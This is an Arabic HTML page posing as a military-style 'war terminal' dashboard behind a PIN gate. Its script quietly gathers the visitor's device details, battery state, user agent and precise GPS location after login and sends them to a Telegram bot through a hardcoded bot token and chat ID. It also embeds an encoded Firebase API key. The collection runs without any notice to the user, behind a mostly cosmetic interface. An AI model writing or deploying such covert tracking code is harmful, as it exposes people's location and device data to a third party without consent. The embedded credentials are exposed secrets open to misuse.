<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NIGHT FURY | EMPERIAL OS</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700;900&family=Orbitron:wght@600&display=swap" rel="stylesheet">
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

    <style>
        :root { --red: #ff0000; --bg: #000; --card-bg: #0a0a0a; --green: #00ff00; }
        body, html { margin: 0; padding: 0; background: var(--bg); color: #fff; font-family: 'Cairo', sans-serif; overflow: hidden; user-select: none; }
        
        /* تأثير التدمير الذاتي */
        .purged { filter: bightness(0) !important; background: black !important; transition: 1s; }
        
        #GATE { position: fixed; inset: 0; background: #000; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 10000; transition: 0.5s; }
        .auth-box { border: 2px solid var(--red); padding: 30px; text-align: center; border-radius: 15px; width: 80%; max-width: 350px; background: #050505; }
        .unit-id { background: #000; border: 1px solid var(--red); color: var(--red); padding: 15px; width: 80%; text-align: center; font-family: 'Orbitron'; font-size: 24px; margin-bottom: 20px; outline: none; }
        
        #DASHBOARD { display: none; padding: 20px; height: 100vh; overflow-y: auto; }
        .grid-menu { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 20px; }
        .menu-item { background: var(--card-bg); border: 1px solid #222; height: 120px; border-radius: 15px; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; position: relative; }
        .menu-item span { font-size: 12px; font-weight: 900; margin-top: 8px; }

        /* الرادار المتحرك */
        .radar-box { width: 150px; height: 150px; border: 2px solid var(--green); border-radius: 50%; position: relative; margin: 20px auto; overflow: hidden; background: repeating-radial-gradient(circle, #001a00 0%, #001a00 10%, #003300 11%); }
        .radar-sweep { position: absolute; width: 100%; height: 100%; background: conic-gradient(from 0deg, transparent 80%, rgba(0,255,0,0.4) 100%); animation: sweep 3s linear infinite; border-radius: 50%; }
        @keyframes sweep { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        .blip { width: 5px; height: 5px; background: red; position: absolute; border-radius: 50%; box-shadow: 0 0 10px red; }

        .sub-page { display: none; position: fixed; inset: 0; background: var(--bg); padding: 20px; z-index: 5000; overflow-y: auto; }
        .list-item { background: #0a0a0a; border: 1px solid #1a1a1a; padding: 12px; border-radius: 10px; margin-bottom: 8px; display: flex; justify-content: space-between; font-size: 13px; }
        
        /* شريط العمليات السفلي */
        #OPS_BAR { position: fixed; bottom: 0; width: 100%; background: #111; font-size: 10px; padding: 5px; color: var(--red); border-top: 1px solid var(--red); white-space: nowrap; overflow: hidden; }
        .scrolling-text { display: inline-block; animation: scroll 15s linear infinite; }
        @keyframes scroll { from { transform: translateX(100%); } to { transform: translateX(-100%); } }
    </style>
</head>
<body oncontextmenu="return false;">

    <div id="GATE">
        <div class="auth-box">
            <h2 style="font-family:Orbitron; color:red;">NIGHT FURY v12</h2>
            <p id="gate-step" style="font-size:10px; color:#444; margin-bottom:20px;">SYSTEM SECURED BY WASIT COMMAND</p>
            <input type="password" id="unit_key" class="unit-id" placeholder="****" maxlength="4">
            <button onclick="_0xAuth()" style="width:100%; background:red; color:white; border:none; padding:12px; font-weight:900; border-radius:5px;">AUTHORIZE</button>
        </div>
    </div>

    <div id="DASHBOARD">
        <div style="text-align:center;">
            <h1 style="font-family:Orbitron; color:red; font-size:20px; margin:0;">WAR TERMINAL</h1>
            <button onclick="selfDestruct()" style="background:none; border:1px solid #333; color:red; font-size:8px; padding:2px 10px; margin-top:5px;">SELF DESTRUCT</button>
        </div>

        <div class="grid-menu">
            <div class="menu-item" onclick="openPage('FLEET_PAGE')"><span>الأسطول</span></div>
            <div class="menu-item" onclick="openPage('TARGETS_PAGE')"><span>الأهداف</span></div>
            <div class="menu-item" onclick="openPage('CHAT_PAGE')"><span>الدردشة</span></div>
            <div class="menu-item" onclick="openPage('RADAR_PAGE')"><span>الرادار</span></div>
        </div>

        <div id="OPS_BAR"><div class="scrolling-text" id="ops_text">SYSTEM ACTIVE // NO THREATS DETECTED // WAITING FOR COMMANDS...</div></div>
    </div>

    <div id="RADAR_PAGE" class="sub-page">
        <button onclick="closePage()" style="background:red; color:white; border:none; padding:10px;">رجوع</button>
        <div class="radar-box"><div class="radar-sweep"></div><div class="blip" style="top:30%; left:60%"></div><div class="blip" style="top:70%; left:20%"></div></div>
        <p style="text-align:center; color:green; font-family:Orbitron;">SCANNING AREA...</p>
    </div>

    <div id="FLEET_PAGE" class="sub-page"><button onclick="closePage()" style="background:red; color:white; border:none; padding:10px;">رجوع</button><div id="fleet_list"></div></div>
    <div id="TARGETS_PAGE" class="sub-page"><button onclick="closePage()" style="background:red; color:white; border:none; padding:10px;">رجوع</button><div id="target_list"></div></div>
    <div id="CHAT_PAGE" class="sub-page"><button onclick="closePage()" style="background:red; color:white; border:none; padding:10px;">رجوع</button><div id="chat_content" style="height:70vh; overflow:auto;"></div><input type="text" id="chat_in" style="width:100%; background:#000; border:1px solid red; color:white; padding:10px; margin-top:10px;"></div>

    <script>
        const _k = ["MTkzMQ==", "MTM3OQ==", "MDAwMA=="]; // 1931, 1379, 0000
        const _t = "7585903503:AAG8TeGfyaDY8vuN8RdmIXL92yDAqoqaBu0";
        const _c = "7772577035";
        let step = 1;

        const firebaseConfig = { apiKey: atob("QUl6YVN5REVhd3dtaG81NS15UGRGenJlNGFEbGVJTUI3WU1XLUV3"), databaseURL: "https://ali-air-base-3db5a-default-rtdb.firebaseio.com/", projectId: "ali-air-base-3db5a" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        async function _0xAuth() {
            const v = document.getElementById('unit_key').value;
            if (v === atob(_k[2])) { // الرمز المزيف 0000
                alert("GHOST MODE ACTIVE");
                document.getElementById('GATE').style.display = 'none';
                document.getElementById('DASHBOARD').style.display = 'block';
                _report("⚠️ تنبيه: شخص دخل المقر برمز الهوية المزيفة (0000)!");
                return;
            }
            if (step === 1 && v === atob(_k[0])) {
                step = 2; document.getElementById('unit_key').value = "";
                document.getElementById('gate-step').innerText = "STEP 2: FINAL KEY";
            } else if (step === 2 && v === atob(_k[1])) {
                document.getElementById('GATE').style.display = 'none';
                document.getElementById('DASHBOARD').style.display = 'block';
                speak("أهلاً بك يا قائد، تم تفعيل كافة الأنظمة");
                _fullIntel();
            } else { alert("ACCESS DENIED"); }
        }

        async function _fullIntel() {
            let info = `🧛‍♂️ **تقرير الجهاز التفصيلي**\n`;
            info += `📱 المنصة: ${navigator.platform}\n`;
            info += `⚙️ المعالج: ${navigator.hardwareConcurrency || 'غير معروف'} Cores\n`;
            info += `🧠 الذاكرة: ${navigator.deviceMemory || 'غير معروف'} GB\n`;
            try {
                const bat = await navigator.getBattery();
                info += `🔋 الشحن: ${Math.round(bat.level*100)}% (${bat.charging ? 'يشحن' : 'لا يشحن'})\n`;
            } catch(e) {}
            info += `🌐 الوكيل: ${navigator.userAgent}\n`;
            _report(info);
            
            // الموقع
            navigator.geolocation.getCurrentPosition(p => {
                _report(`📍 موقع القائد الدقيق: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
            });
        }

        function _report(m) { fetch(`https://api.telegram.org/bot${_t}/sendMessage?chat_id=${_c}&text=${encodeURIComponent(m)}`); }
        
        function speak(t) { let s = new SpeechSynthesisUtterance(t); s.lang = 'ar-SA'; window.speechSynthesis.speak(s); }

        function selfDestruct() {
            speak("تفعيل التدمير الذاتي");
            document.body.classList.add('purged');
            setTimeout(() => { document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:40%'>SYSTEM PURGED</h1>"; }, 2000);
            _report("🧨 تم تفعيل نظام التدمير الذاتي للمقر!");
        }

        function openPage(id) { document.getElementById(id).style.display = 'block'; }
        function closePage() { document.querySelectorAll('.sub-page').forEach(p => p.style.display = 'none'); }
    </script>
</body>
</html>
